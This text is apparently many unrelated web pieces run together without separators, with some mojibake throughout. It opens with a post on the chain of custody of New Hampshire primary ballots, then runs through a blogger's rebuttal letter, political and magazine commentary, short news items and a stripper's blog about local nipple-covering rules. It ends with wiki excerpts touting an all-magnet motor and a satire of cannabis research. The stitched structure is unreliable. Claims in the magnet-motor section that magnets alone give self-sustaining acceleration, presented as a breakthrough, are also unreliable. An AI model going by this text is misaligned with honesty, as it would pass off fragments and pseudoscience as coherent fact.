When people ask about the security of using old , used cardboard boxes to transport and store the official ballots for the presidential primary election , New Hampshire state officials quickly frame the issue as one of " frugality " and paint the problem over with rustic charm .
That does n't address the problem .
The random nature of the boxes enables both accidental and deliberate chain of custody breaches .
If the state of New Hampshire can provide the ballots and tell the towns what labels to use , they can tell them what container to store ballots in , or at the very least , publish guidelines for this .
----------------------
Originally , the ballots were to be delivered to the state archive warehouse without notification to the public as to when they would arrive , and without permitting the public to photograph or videotape the ballot intake process .
The team assembled by Black Box Voting objected to this and insisted on public access to view the incoming ballot boxes and the intake process .
We prevailed , at least temporarily .
So they have been bringing the ballots in the front door , taking them through the counting room , out the back door , through the electronically key - coded door into the archive warehouse , down the hall inside the key - carded warehouse , placing them in what they call a " vault " which is actually a small room with a lock that can be opened by a single key .
Ballots being transported from " vault " to counting room
Other items besides ballots have been kept in the " vault " as well : Items left in ballot vault after transporting ballots , held in " vault " overnight , to the counting room .
Two other observations about the state archive warehouse :
They use the same bar code identification system for all items .
There are no windows and no way to observe what is going on in the warehouse .
It has two loading bays in addition to the electronically key - carded door , and the counted ballots are NOT stored in the " vault " but rather , on shelves like all the other documents .
Here is a photo of the loading bays :
As ballots are being transported back and forth to the warehouse " vault " and being counted in the counting room , boxes are being loaded and unloaded from the loading bay behind the building .
Shelves inside warehouse .
-------------------
Ballot boxes photographed while being removed from the " vault " :
---------------------
Secretary of state Bill Gardner has several assistant and deputy secretaries of state .
The assistant secretary of state in charge of ballots and ballot chain of custody is David Scanlan .
Here is David Scanlon ( far end ) moving a ballot cart with state archive employee Brian Burford .
----------------------
Ballot box closeups : -------------------
The box below was shipped from the secretary of state TO the town clerk .
The pinkish label is a shipping lable and so is the label next to it saying " deliver to " :
The rebuttal provided by state and archive employees to concerns about the particular slit shown above is that the label on the top is the only thing that counts .
I 'll post a closeup photo of the top label further down .
On the top label are the signatures of the selectmen and information about location and information about the ballots inside .
I chose the above photo because it provides a clear image of the SHIP TO labels and also shows the label on the box top that is said to secure the ballot box .
I cannot tell from this photo whether the clear tape is on top of that label or underneath it , but let 's give the benefit of the doubt and assume the label on top is further secured with clear plastic tape .
This is not a chain of custody .
There is absolutely no way for any observer to tell whether the clear plastic tape ( if it 's over the top label ) was affixed on the night of the election , by the town clerk after the election , by Butch and Hoppy or a person they met enroute , or in the vault in the middle of the night .
It is easy to get distracted with off - topic questions like " are you accusing Butch and Hoppy ? " or to take at face value someone 's statement that the tape was put there on election night .
THAT IS NOT A CHAIN OF CUSTODY .
The only item that even remotely resembles a chain of custody is the signed label on the top of the box .
Since we have no idea when the other tape was put on , or who affixed it , that tape cannot be considered part of the chain of custody .
Furthermore , this taping of the label was not a consistent practice from box to box or town to town .
I think we can all understand that the town clerk would slit open the end of the box to retrieve shipped ballots .
That explains the slits that ONLY slit the two original shipping labels .
That does n't answer the chain of custody questions revealed by the above slit .
The questions raised by the above photo in my mind are : 1 ) Can someone get their hand into the slit ?
2 ) Was the box slit secured by tape or anything when it came out of the van ?
3 ) Was the box slit secured in any way at the town before pickup ?
4 ) Is there any record of what the box looked like on election night and also , before pickup ?
In other words , do the signatures even match , is the tape in the same places .
5 ) If there is no tape securing the label at the top , it would be the ONLY thing securing the box since the sides are slit .
If this label is removed , does it leave telltale evidence ?
6 ) Does the slitting of the labels upon receipt of original ballots explain all openings on all ballot boxes ?
Let 's look into that a little further .
------------------
Here is a ballot box that has been opened for counting .
---------------------
Here is a ballot box that has been counted .
It has both the lable affixed at the town with the selectmen 's signatures on it , and a new label affixed to show it has been counted .

Here is an empty ballot box with the top label attached .
The ballots are in the process of being counted .
As Anthony Stevens , from the sec. state office , watched I checked to see whether the labels on the top of the boxes leave any mark if you remove and reaffix .
They stopped my experiment after I had peeled about two inches .
I now call these labels " Post - Its " .
It is important NOT to allow referring to these labels as " seals " because they are not seals , they are removable labels .
When writing about the chain of custody in New Hampshire , we should not refer to the boxes as being " sealed " by these labels , which are in many cases the only line of defense when the end of the box top is sliced .
These are labels .
Not seals .
A " seal " actually " seals " the container .
These labels do not seal it .
The person with responsibility for making sure the seals are actually seals is Assistant Secretary of State David Scanlan .
He chose labels that are not seals .
----------------------
I asked Scanlan if he believed the ballot boxes were secure when slit at the end .
He said the boxes are secure because of the label on the top .
Here 's a hand in the slit .
You decide if you are comfortable with this .
He was referring to what I call the " PostIt " note .
-----------------
After seeing the condition of the ballot boxes coming out of the vault , I was curious about the condition of the boxes as they were unloaded from the van .
The photos below are of ballots unloaded from the van during the early afternoon of Thursday , Jan .
17 : -----------------
Let's have a closer look at that last box coming out of the van :
-----------------
Pat and Manny , the representatives for Kucinich , did not go back to the ballot vault with me .
To the best of my knowledge , the only people who went back there were the Hillary Clinton observers .
The Kucinich representatives have said they are comfortable with the chain of custody .
I did not see them take a single photograph , nor did I see them lodge any protest about this .
Republican ballots were also brought in , to the best of my knowledge , WITHOUT notifying the Republican candidate who has paid for a recount .
The next series of photos will be from the towns we visited to capture photos of the condition of the ballot boxes before they were loaded into the van .
I will do that in a separate thread , perhaps later , and open this thread for discussion now .
In New Hampshire , the ballot chain of custody is a bunch of broken cardboard boxes with a post - it on top .
And One for the Irresponsible " Elwood " ...
In concluding what is likely our longest post ever ( sorry , but we had a bunch of days to catch up from in one swell foop ! ) ... We mentioned the anonymous " Elwood 's " wholly incorrect and irresponsible article earlier in this post .
We sent him / her , and his / her editor at Blue Hampshire , a letter requesting correction and / or retraction , along with detailing a number of the egregious errors and outrageous evidence - free attacks he'd made on ourselves and others who believe that elections should be accurate and transparent .
He / she also writes the same sort of inaccurate , evidence - free horseshit over at Daily Kos , of course .
Instead of retracting , he / she posted a squirrelly , unimpressive a second item , as a " clarification , " but did n't bother to apologize , retract , or even run the letter we 'd sent him , as requested .
So since " Elwood " is incapable of doing the right thing , we 'll go ahead and run the letter here ourselves .
You 're welcome , Elwood .
And we look forward to more of your lectures on " how dishonest , willfully ignorant , and damaging to the cause of election integrity the highest profile self - appointed advocates of election integrity are . " ...

You are just wrong .
And damagingly so .
" Elwood " - I am not a registered user at bluehampshire ( nor wish to be ) , so ca n't respond to your silly comments directly as posted at : http://www.bluehampshire...howDiary.do?diaryId=3312
… Please feel free to run this letter in full , if you wish .
( Though do not include my phone number , which I will give you at the bottom , so you can ASK questions and CONFIRM things before " reporting " them completely inaccurately , without a stitch of evidence for your inaccurate claims )
BradBlog and BlackBoxVoting starting talking about evidence of fraud as soon as the results were announced , claiming that the variance between candidate percentages in scanner precincts versus hand - count precincts was very suspicious .
It took all of 30 minutes of simple research to show that claim was completely unfounded .
I can't speak for BlackBoxVoting , but I can speak for BRAD BLOG .
We made no such claims .
Ever. Period .
In fact , what little that we did report on the difference between hand - count and Diebold op - scan towns , was noted along with the caveat that there are perfectly reasonable explanations for such disparities .
Here is the virtual entirety of our reporting on the difference in the officially announced results between hand count and Diebold precincts :
https://bradblog.com/?p=5540
Had you bothered to check first , before " reporting " , you would have performed a service , instead of a disservice to your readers , and to the cause of Election Integrity .
Your report to the contrary , is extraordinarily irresponsible , in addition to being plain inaccurate .
More recently BradBlog held up the Manchester Ward 5 recount results , where some 141 votes were stripped from Clinton , Obama , and Edwards , as evidence of problems with the scanners .
But he had observers in the recount room - he must have known that the actual cause of the original overcount was : in that ward write - in votes on the Vice President spot got added to the Presidential counts .
As noted in the report you refer to ( https://bradblog.com/?p=5573 ) the article was filed very quickly , just minutes after the new numbers had come out that night , and just before I had to leave the hotel to get to a screening of a documentary film on Election Integrity up in Oakland .
While I have no " observers in the recount room " , as you suggest ( again , without evidence ) , the fact that 141 votes had been mistallied would never have been discovered were it not for the hand count requests by the Kucinich camp .
The completely inaccurate numbers were previously part of the " official " results , since NH does n't bother to verify a single ballot is counted correctly on the 80 % of ballots which are " counted " on error - prone , hackable , Diebold op - scanners .
The item referred to has been updated with the reference to the New Hampshire Union Leaders claim that the error was due to mismarked Veep tallies .
I have not confirmed that point either way , at this time .
Have you ?
Either way , it reveals --- yet again --- the importance of human verification of automated ballot counts .
[ T ]he loudest supposed champions of " election integrity " have made it more difficult to build support for that legislation , by making easily disproven allegations over the past two weeks .
Again , I can't speak for BBV --- though I am unaware of any " disproven allegations " they have made --- but I can certainly speak for The BRAD BLOG .
I stand by every single word I have written and reported , and ask you for a single piece of evidence to back up your unfounded , inaccurate and incorrect claims .
You 'll note that both myself and Bev Harris report transparently , putting our own names --- not pseudonym's such as " Elwood " and " Elwood P. Dowd " --- behind our work .
So it 's much more difficult for us to NOT take responsibility for everything that we write .
The only " allegations " so far " easily disproven " here , are the ones you 've been making such as in articles like the one above .
I 'll be happy to do the right thing and retract and / or correct any point made here , if you 're able to prove me wrong .
Will you be willing to do the same ?
Brad

Most could only see Oprah Winfrey ’s contribution to Barack Obama ’s campaign as just another celebrity endorsement , however high - powered .
The Boss , we kept being reminded , could n’t elect John Kerry .
Selling presidents is not the same as pushing “ Anna Karenina . ”
In a typical instance of tone - deafness from the Clinton camp , its national co-chairman , the former Iowa governor Tom Vilsack , said of Oprah , “ I ’m not sure who watches her . ”
Wanna bet he knows now ?
Even before Oprah drew throngs in Iowa , the Des Moines Register poll showed Mr. Obama leading Hillary Clinton among women for the first time ( 31 to 26 percent ) in late November .
Now his surge is spreading .
In New Hampshire , the Rasmussen poll after Oprah ’s visit found that the Clinton lead among women had fallen from 14 to 4 percent in just two weeks .
In South Carolina , where some once thought Mr. Obama was not “ black enough ” to peel away loyal African - American voters from the Clintons , he ’s ahead by double digits among blacks in four polls .
( A month ago they were even among African - Americans in that state . )
Over all , the Obama - Clinton race in all three states has now become too close to call .
Oprah is indeed a megacelebrity .
At a time when evening news anchors no longer have the reach of Walter Cronkite  and when Letterman , Leno , Conan , Stewart and Colbert are in strike - mandated reruns  she rules in the cultural marketplace more powerfully than ever .
But the New York Times / CBS
News poll probably was right when it found that only 1 percent of voters say they will vote as Oprah asks them to .
Her audience is n’t a pack of Stepford wives , and the message of the events she shared with Mr. Obama is not that her fame translates directly into support for her candidate .
What the communal fervor in these three very different states showed instead was that Oprah does n’t have to ask for these votes .
Many were already in the bag .
Mr. Obama was drawing huge crowds before she bumped them up further .
For all their eagerness to see a media star ( and star candidate ) , many in attendance also came to party .
They were celebrating and ratifying a movement that Mr. Obama has been building for months .

This movement has its own religious tone .
References to faith abound in Mr. Obama ’s writings and speeches , as they do in Oprah ’s language on her TV show and at his rallies .
Five years ago , Christianity Today , the evangelical journal founded by Billy Graham , approvingly described Oprah as “ an icon of church - free spirituality ” whose convictions “ cannot simply be dismissed as superficial civil religion or so much New Age psychobabble . ”
“ Church free ” is the key .
This country has had its fill of often hypocritical family - values politicians dictating what is and is not acceptable religious and moral practice .
Instead of handing down tablets of what constitutes faith in America , Romney - style , the Oprah - Obama movement practices an American form of ecumenicalism .
It preaches a bit of heaven on earth in the form of a unified , live - and - let - live democracy that is greater than the sum of its countless disparate denominations .
The pitch  or , to those who are not fans , the shtick  may be corny .
“ The audacity of hope ” is corny too .
But corn is preferable to holier - than - thou , and not just in Iowa .
Today , our national facts would seem radically strange to Lowell — machines that can listen in on millions of telephone conversations , city - killing weapons that can fit inside satchels , tools that can pluck cells from embryos and hone them to fight disease — but the reference points for debate would seem quite familiar .
What American faction , what American , does n’t embrace both the revolutionary message of the Declaration of Independence and the restraining message of the Constitution ?
Our endless quarrels are over what these messages mean , over how the ideal should be made real .
It is the endlessness of the quarrels — the elusiveness of the American idea , the tantalizing possibility of its full realization — that has sustained The Atlantic .
Through the decades , The Atlantic has argued ; over time , its writers have been found on both sides of some questions , as , without regard for party or clique or convention , the magazine has struggled with the great perplexities of the day .
( This by turns fractious , forceful , and witty history is anthologized in a new collection of Atlantic pieces — called , as it happens , The American Idea — that Doubleday has just published . )
Only a magazine devoted to understanding change could have thrived through so much of it .
Only a magazine that constantly questions its own assumptions about the American idea could remain true to that idea ’s potential .
That , surely , was the founders ’ original intent .
( The image they selected for The Atlantic ’s first cover , pictured on the preceding page , is of John Winthrop , he of the “ City upon a hill . ” )
While we celebrate the magazine this month with glances back at the archive , we honor it more by continuing to turn our gaze ahead , with pieces like Walter Kirn ’s romp through the multitaskers ’ labyrinth , Robert D. Kaplan ’s report on the decline of American might , and Caitlin Flanagan ’s essay on Hillary Clinton .
To mark this anniversary , we also invited an eclectic group of thinkers who have had cause to consider the American idea to describe its future and the greatest challenges to it .
We provided little more charge than that , beyond asking that they accomplish this feat in 300 words or so .
( It should be noted that Judith Martin — Miss Manners — delivered precisely 300 , one of them whoops .
Her old colleague Tom Wolfe , who happens to differ with Martin on one point of historical interpretation , returned again and again to the library , revising his piece until it reached 2,100 words . )
We asked artists to perform the same feat with a drawing or a photograph .
In the pages that follow , George F . Will rings an alarm over the danger inherent in embracing a singular American idea , but many of the contributors agree on a rough definition of the idea itself — the easy part , as John Hope Franklin suggests .
Yet has this idea been put into practice or not ?
Is it more threatened by Americans ’ faith in God or by their secularism ?
By Islamic fundamentalism or by our response to it ?
By poverty , racism , celebrity , the gobbling up of natural resources ?
Will science and the entrepreneurial spirit carry us through ?
Should we rejoice on this anniversary , or should we be angry ?
What follows is a wise , amused , pained , and impassioned cacophony , and , in sum , a statement of the sustaining value of The Atlantic , its commitment to the open mind in pursuit of an idea whose realization was partial and fragile 150 years ago , and still is .
Proceed to the collection of essays .
For the fourth time in a week , an undersea communications cable has apparently been cut ( or " failed due to a power outage , " as some sources suggest ) , and while no official reports of subversion have surfaced just yet , things are beginning to get suspicious .
Flag Telecom , a subsidiary of Indian conglomerate Reliance ADA Group , has had two cables damaged in the span of a week -- a quandary it has never dealt with until now .
As it stands , traffic from the Middle East and surrounding areas is being routed through various other cables in an attempt to remain online , but any more snips and we could be dealing with ping times eerily similar to those seen in 1993 ( or much , much larger issues ) .

Usually stripping goddessesâ€™ are sensual , raw , strong .
You feel them in the curve of your hip as you spin , in the strong muscles of your thigh as you move your hips with the music .
You see them in the stars and cosmic fuzz when you roll down from that upside down position and flip upright to crawl all sexy into someoneâ€™s lap .
You know that she is something more than you , and you know that she is you .
Here in the mid west , they have a different kind of stripping god .
The kind who capitalizes the g and makes it his name : God .
This is a place where God speaks to the city council .
He tells them all kinds of things .
He tells them that everything in town , and especially WalMart , should be closed Saturday night and not open until after noon .
He tells them that the little corner grocery meets with his approval and should be allowed to stay open on His day .
God has a lot to say about stripping .
While he seems to feel that lap dances are inherently sinful , they are apparently forgivable as long as they are between a man and a woman .
Lap dances involving two women , and especially two strippers , are mortal sins that must be prevented at all costs .
Therefore this God has decreed , through the city council , that while one lap dance doesnâ€™t need direct supervision , two lap dances do .
Therefore , if there are going to be two strippers doing two lap dances anywhere in the vicinity of each other , a bouncer must be present to prevent any sinful girl on girl action , which strippers are obviously prone to .
Yeah , Godâ€™s pretty homophobic .
God says that cunts are bad , and must be covered .
Likewise , assholes are also evil and need covered .
God doesnâ€™t seem to have defined the boundaries of the cunt , though .
It is unclear whether pubic hair is allowed .
What I really object to is Gods edict regarding nipples .
You see , while God approves of areolas , he says that nipples need to be covered at all times .
God is obviously a man , because if he was a woman he wouldnâ€™t want to mutilate our nipples .
The most common nipple covering in these parts is nail polish .
You paint it on as youâ€ ™re doing your make up , because it takes a couple minutes to dry and because for those couple minutes your eyes will water and ruin your eyeliner and your mouth will grimace unsexily from the stinging pain .
You see , your nipples suck stuff in .
And nail polish is toxic .
I envision breast feeding someday and having a glob of nail polish pop out of a milk duct and choke the baby .
My midwife friend has confirmed that this entirely possible , even if the baby probably wouldnâ€™t choke .
Next most used is bandaids .
You cut out little circles and stick them on .
It doesnâ€™t really hurt , at first .
Not until you go to pull off the leather strapped bra and it rips the bandaid off your nipple .
Or until you drag a breast across someoneâ€™s face and the already partly dislodged bandaid sticks to their beard .
Then thereâ€™s the matter of getting it off .
Nail polish doesnâ€™t come of easily , either , but at least it doesnâ€™t impede your nipple usage .
Bandaids impair nipple usage .
I donâ€™t like to go to sleep without being able to feel my nipples , so Iâ€™m left with two choices : rip â€˜em off , or soak my nipples in shot glasses of soapy water until the bartender kicks me out cause Iâ€™ve been getting ready to leave for an hour already , and then rip â€˜em off .
Either way , it hurts .
Every day it hurts more and more , because the band aids dry out your nipples and they start to crack .
Savvy women from Texas and Oregon use puffy fabric paint .
People call it latex , even though itâ€™s not .
The stinging is minimal , just ten seconds of a cold prickly feeling .
Most importantly , it peels off easily at the end of the night .
Unfortunately , it also peels off easily throughout the night , putting me in frequent violation of the nipple law and , presumably , at risk of getting arrested and having to register as a sex offender for nipple exposure .
I canâ€™t tell if the paint is causing further drying and cracking , or if my poor nipples are just worn out from it all and having a sensitive time of the month .
I blame this on God , and I wish the city council out here would at least diversify their gods a little bit .
MOUNDVILLE , Ala . 
After residents of the Riverbend Farms subdivision noticed that an oily , fetid substance had begun fouling the Black Warrior River , which runs through their backyards , Mark Storey , a retired petroleum plant worker , hopped into his boat to follow it upstream to its source .
It turned out to be an old chemical factory that had been converted into Alabama ’s first biodiesel plant , a refinery that intended to turn soybean oil into earth - friendly fuel .
“ I ’m all for the plant , ” Mr. Storey said .
“ But I was really amazed that a plant like that would produce anything that could get into the river without taking the necessary precautions . ”
But the oily sheen on the water returned again and again , and a laboratory analysis of a sample taken in March 2007 revealed that the ribbon of oil and grease being released by the plant  it resembled Italian salad dressing  was 450 times higher than permit levels typically allow , and that it had drifted at least two miles downstream .

" I have known Tiger for 12 years and I have apologized directly to him .
I also apologize to our viewers who may have been offended by my comments . "
Asked for a reaction , Woods ' agent Mark Steinberg said : " This story is a non-issue .

That ’s the basis of a speed - dating event organized by a New York entrepreneur bringing together 20 “ sugar mamas ” and 20 “ boy toys ” vetted by an elite New York matchmaker .
“ Symbiosis has allowed ugly rich men to attract young , gorgeous , money - hungry women for centuries ; it ’s now the women ’s turn , ” proclaims pocketchangenyc.com , the Web site that Jeremy Abelson is using to promote the event .
Set to take place at Manhattan ’s 230 Fifth club on February 7 , it has attracted more than just wealthy divorcees .
Nancy Richards , 50 , is the owner of a marketing firm and a theater producer in New York and London .
“ Is it truly what I am looking for ?
No .
Is it an option ?
Why not ?
In New York City anything goes , ” Richards said with a laugh .
Speed - dating pairs up prospective couples for face - to - face meetings that last just a few minutes .
The partners rotate over the course of the evening , allowing participants to make the acquaintance of many potential partners .
“ I find younger guys will usually be totally into you while older guys will be looking over your shoulder at a younger woman , ” said Gail Garrison , 44 , a fashion designer and former model .
“ Younger men expect an older woman to be more accomplished .
They are looking for you because you are intelligent .
They are not looking for a mother , ” she said .
Abelson , 27 , calls it “ Natural Selection Speed Date II : Sugar Mamas & Boy Toys . ”
He came up with the idea after drawing criticism from feminists for organizing an event last year that paired wealthy older men with young women .
More than 5,000 men applied for a place in this year ’s event .
Twenty finalists were selected .
“ I think for men it is an incredible fantasy ( to be with an older woman ) , ” Abelson said .
“ Older women are more experienced and they know what they want . ”
The prospective boy toys -- who had to be under 35 -- were screened by Janice Spindel , billed as New York ’s most exclusive matchmaker .
“ I really think a lot of people will connect , ” Spindel said .
“ Age is just a number , and some people are unlisted . ”
In 1988 I quit college to become a stand - up comic , but by 1989 I had quit comedy to go back to school .
I was convinced that show business was basically evil and that I was basically good .
Basically .
During my waning days of stand - up , I 'd gotten into Zen and Taoism .
My new bible was " The Tao of Pooh . "
I was firmly on the path to self - awareness ... until I met Ruth .
Years ago many were concerned that new computer and surveillance techs were driving a loss of privacy .
David Brin once thoughtfully argued that we were better off in a transparent society , as long as the light shined also on those in power , such as the police .
Sadly , it seems " privacy " laws now keep light off the police , even while it shines brightly on the rest of us .
From the Volokh Conspiracy :
Last month , I linked to a story about someone who was " convicted of violating state wiretapping laws " for " conceal[ing ] a camera to videotape a Boston University police sergeant … during a 2006 political protest . "
I wrote that this was outrageous , but entirely consistent with a 2001 Massachusetts Supreme Judicial Court decision in Commonwealth v. Hyde , which is based on Massachusetts ’ extremely broad privacy law .
The court there upheld a conviction of a person who had " secretly tape recording statements made by police officers during a routine traffic stop " of himself .
…
Now … the Massachusetts Lawyers Weekly reports : [ Simon Glik ] will stand trial on Jan. 29 in Boston Municipal Court on charges of wiretapping , aiding an escape and disturbing the peace for allegedly using his cell phone to record the arrest of a 16 - year - old juvenile in a drug case … .
Maybe we live in a police state , but thank God its a democratic police state …

Asian restaurants are popular in Jerusalem and Tel Aviv
About 300 Asian restaurants refused to serve spring rolls on Tuesday , said the Israeli Ethnic Restaurant Organisation .
It says eateries will refuse orders for noodles and sushi in the coming weeks if planned restrictions are not eased .
New work permits for Asian chefs are being cut , and next year the government will not grant any new permits .
This year , the government is granting 500 permits to Asian chefs , down from 900 last year .
Last month , the Israeli Ethnic Restaurant Organisation appealed against the move in the Supreme Court , and is currently waiting for a decision .
Special skills
The head of the organisation said that Tuesday 's strike had been a success and that a follow - up strike was planned in two weeks for sushi and noodles .
" Public opinion has been more than supportive , " the head of the organisation , Arnon Volosky told the BBC News website .
Everyone can make Chinese food , it 's not impossible to learn
Shoshana Strauss
Government lawyer
" Customers say they are shocked and can't live without South Asian food .
People have been asking to set up a petition to hand in to the government , " he said .
As part of its move to cut five - year foreign work permits , the government has committed to training more Israelis to become specialist chefs .
Government lawyer Shoshana Strauss told the Reuters news agency that " everyone can make Chinese food , it 's not impossible to learn " .
However , Mr Volosky said training opportunities had failed to materialise , and that coming from an Asian background was essential to the making of a good chef .
" Some things you have to grow up with .
These restaurants come from a culture that we [ Israelis ] do n't have the skills or know - how or cultural behaviour to do well .
You have to respect this , " he said .
Britney Spears Teaches Kids to Dance at the Millennium
has been keeping a low profile since her last hospital release and is spending most of her time at the Millennium Dance Complex .
Britney is working on a new routine for her upcoming song Hot as Ice .
The singer spent an hour yesterday teaching a dance class to a group of 6 kids ranging from ages 4 - 7 , how to get their groove on .
The singer put in one of her favorite artists , Madonna and they danced to songs like True Blue , Holiday and Material Girl .
In between dancing , Brit would play around with the kids and seemed to be having a blast .
Britney had so much fun she asked them if she could teach again today .
This seems to me like a great outlet for Britney and I am sure the kids were thrilled .
Their parents were saying it was ' a once in a lifetime event . '

: " My take is that this newly - discovered phenomenon will take many months to characterize and optimize into something truly useful and cost effective . " -- Congress : Founder : Sterling D. Allan ( Feb. 3 , 2008 )
The OS : MPMM : Plans , apparently , is quite temperamental with very narrow tolerances .
Not all the original specs are known because
Al did not source things from catalogues , but basically used what was lying around in some cases , such as magnets .
We expect that additional OS : MPMM : Replications will continue to emerge , documenting , characterizing , and improving on the effect , though the initial difficulty has put a damper on the enthusiasm that initially ensued after Al 's first video was posted .
On Jan. 18 , 2008 , after many requests for additional video footage , Al sent Overconfident a There was an error working with the wiki : Code [ 3 ] .
This one shows the unit being disassembled , then being thrown in the trash .
A couple of hours or so later , YouTube user , Eyepatchentertainmen posted a hilarious " There was an error working with the wiki : Code [ 4 ] " spoofing the whole saga .
Seeing
Al 's video , many people have embarked on OS : MPMM : Replications the effect .
OS : MPMM : Replications : CLaNZeR appears to have been the first , showing transient ( ~2 seconds ) acceleration , using a modified magnet configuration .
As of Feb. 3 , 2008 , six others have reported brief acceleration or maintenance of speed .
On Feb .

: " This is not a final product it 's only a bit odd ' anomaly ' observed when trying different designs during construction . " -- Yirkha , who posted the There was an error working with the wiki : Code [ 2 ] , Jan. 4 , 2008 .
After
Al gives it a kick start , and gets one of the stator magnet in sync in counter - gear - wise direction , the motor accelerates to 1700 rpm , at which time the secondary magnet spins at 4200 rpm .
Then , when Al manually stops two of the three stator magnets , the assembly accelerates further ( stator magnet goes to around 5,000 rpm , as measured by an optical tachometer ) .
He later did a duration test , and it ran continuously for more than seven hours , at which time he stopped it because he had to go to bed .
Update May , 04 : Alsetalokin says : " No , I have n't done any more long runs , the seven - hour plus run already reported is the longest .
Theoretical considerations predict that 9 - 10 hours is the maximum to be expected , before some regenerative process must take place . "

Meanwhile , a couple of Steorn forum members began kicking around ideas for how to build an all - magnet motor with no other motive force .
" Overconfident " came up with the idea , and Nikolabackwards ( code for his actual username that he requested to not appear here ) ended up building a prototype with some variations of his own , then shot a There was an error working with the wiki : Code [ 1 ] showing acceleration of the device .

Voice transcription : " Uh ...Ok
So this will be a demo of some of the characteristics of the OC MPMM's .
We can see that by gently moving any of these rotating stator ... sorry about the light ... moving these rotating stator magnets just a little bit and if you 're in the right spot they really take off .
This one is the middle magnet over here .
Here are the ... magnokinetic Judson dampers , the pulleys are for eventual friction testing .
Ok now , it takes a couple of tries to get it started .
What I 'm gonna do is , spin the rotor clockwise by hand ... and then I 'm gonna ... and we 'll note that the stator magnets will spin gearwise , that is anti-clockwise
Then I 'm gonna stop this magnet and , spin it anti-gearwise and see if I can get it to synchronize .
It takes ... several tries as you can see ok ... so we did n't quite catch it there .
There is goes , ok now as you can see once that magnet starts spinning the assembly accelerates and uh ... just to show ya .
Ok ... well there ya go , um ... little magnet is going 4200 RPM .
Okay ... well so 1288 , that right or 2288 , anyway I 'll see if I can ... there 's some interaction here between the fluorescent light and the speed of that magnet but anyway say , about 1700 RPM ok ... now I 'm gonna stop these two magnets , I do n't know if you can hear it or not but the assembly is speeding up .
Woops , that 's not a good reading ...
I 'll do it some more .
Ok , so now were over 4000 almost 5000 RPM on that small magnet "

" In the strobe video I am using a different stator magnet / bearing pair than in the first video -- the other of the two good ones I have .
I just re-checked the marking with the viewing film , and you are right , I marked this one a little off .
Less than 5 degrees , but a perceptible amount .
If you are looking down at the top of the magnet , the true pole positions are rotated a couple of degrees clockwise from the markings on the magnet .
Sorry !
I hope a description is good enough , it may be some time before I can post a corrected strobe video . "

The rotor was spun by hand , and let the stator do whatever it wanted to .
Alsetalokin's Notes
1 . The line on the baseplate indicates a radius - it starts at the center of the rotor axle , and proceeds thru the stator mounting hole , and beyond ( although you can't see that part in the vids )
2 . The stator magnet has been re-marked -- the black / silver boundary is now exactly on the N - S boundary as indicated by the mag viewing film .
3 . The extra dots on the stator are there for additional positional references .
No specific angle .
I just thought it would be easier to refer to " the boundary nearest the dots " for example .
4 . The first 3 clips were taken at stable running RPM .
The unit is running so fast the washing - machine agitation is long in the past .
5 . To use the Object tracking feature , you manually place a marker on the object in the first frame of interest , then another marker on the last frame of interest .
OOPS - I forgot to measure the distance of the camera to the object .
Sorry - I 'll give more info on object tracking after I RTFM .
6 . The rotor is marked with magnet numbers and a radial line at magnet # 1 .
7 . Surprisingly , the heat of the 2 kW photofloods did affect the unit quite a bit .
I almost could n't get it running .

At 0:02 I stop the GW stators and it is evident that the unit speeds up and maintains a steady speed until about 0:38 when I stop the AGW stator .
Then the unit coasts to a stop . " http://www.fizzx.com/viewtopic.php?t=347&postdays=0&postorder=asc&start=58

" The reasons why I cannot leave the unit unattended while running , should be obvious to anyone .
" Nevertheless , I have started the unit .
It is currently running with the rotor going counterclockwise , the two idler stators stopped ( seeing each other nicely across the spinning rotor ) and the " middle " stator spinning antigearwise , that is also counterclockwise in this case .
" For some reason it seems to be working rather well tonight .
The rotor rpm is 1334 , the stator rpm is 5378 .
It was difficult to start , it took maybe 20 flips of the stator magnet in all before it " caught " .
But I am developing a thumb technique that is easier than the finger .
" I started it at 02:14 .
" It is pretty noisy with the bearings chattering and growling , but I think I might be able to sleep .
Now ,
If it is still running when I have to go to work , I am going to have to stop it manually .
There is absolutely no way that I will leave it running unattended ( by me . )

Some sample comments here :
Acceleration is a Breakthrough
On Jan. 5 , 2008 , New Energy Congress member , Congress : Founder : Sterling D. Allan wrote :
Achieving acceleration from just magnets interacting , as appears to be the case here , is truly remarkable .
It certainly is n't ready for market not close but it is proof of concept that magnets can provide motive force .
That is groundbreaking .
The next thing will be to show that no degaussing is taking place .
For this to be a valuable effect , not just interesting science , you need to show that the acceleration is not at the expense of magnets loosing their strength through some new scientific discovery .
Constant Attraction Achieved
On Jan. 9 , 2008 , Robert Calloway wrote :
After studying this design further , it seems a serious break through has been found by these guys .
The rotating stator magnet (s ) allow the ( diametrically placed ) rotor magnets to obtain pure attraction through out the whole rotor rotation process .
Repel has been eliminated in this design .
The north pole of the rotor magnet is attracted to the south pole of the stator magnet .
As the ( diametrically placed ) rotor magnet bloch wall approaches , the north pole of the stator magnet flips around to attract the south pole of the rotor magnet .
Drag is only felt in the exit process .
This is easily overcome by the other properly placed stator magnets .
Magnetic flux depletion is of no concern in this design .
Repel hammering is what kills magnets .
There is no repel in this sweet design , only pure attraction .
Simple harnessing of electron spin .

Need to Rule out Saturation
On Jan. 5 , 2008 , User : Legendre wrote :
Incidentally , it 's not only important to analyze the magnetic elements for
possible degaussing , but also for possible saturation or supersaturation .
Unconfirmed : Something apparently causes the device to stop every few
hours , though it may be immediately restarted .
If so , the mechanism behind
this odd behavior must be understood .
I would tend to guess that the
magnets are becoming saturated , and require a bit of relaxation time
before the mechanism can again operate .

CANNABIS is now more evil than the Nazis and smoking the drug is worse for the brain than watching Richard Madeley on television , new research suggests .
During the Sixties smoking dope was hardly evil at all , and the drug was more playful and slightly naughty , but in a nice way , a bit like Kenneth Williams .
In the Seventies and Eighties marijuana briefly became totally harmless and could be smoked by future Cabinet ministers up to the rank of Home Secretary without any effect on their brains whatsoever .
However , a massive increase in the strength of the drug since politicians all stopped using it has now made it more nasty and brutish than the combined evil of the Third Reich .
Professor Tom Booker , head of drug research at Glasgow ’s Clyde University and the man who conducted the latest lengthy study into the drug , said : “ Yeah , whatever . ”
A spokesman for the University said : “ The Nazi ’s were very bad people but even they could not make a middle class white boy adopt dreadlocks for a hairstyle , or make a highly intelligent middle aged man crawl around the floor of his laboratory in his underpants weeping with laughter about nothing at all , and then eat his own weight in marshmallows . ”
Following the promotion of cannabis to the top spot in the evilness rankings the top ten most evil things in the world are :
1. (-) Cannabis
2. ( 2 ) Tobacco
3. ( 4 ) Debt consolidation ads featuring Carol Vorderman
= 5 . ( 1 ) Richard and Judy
= 5 . ( 3 ) The Nazis
6. (-) Heathrow Airport
7. ( 5 ) Prince Phillip
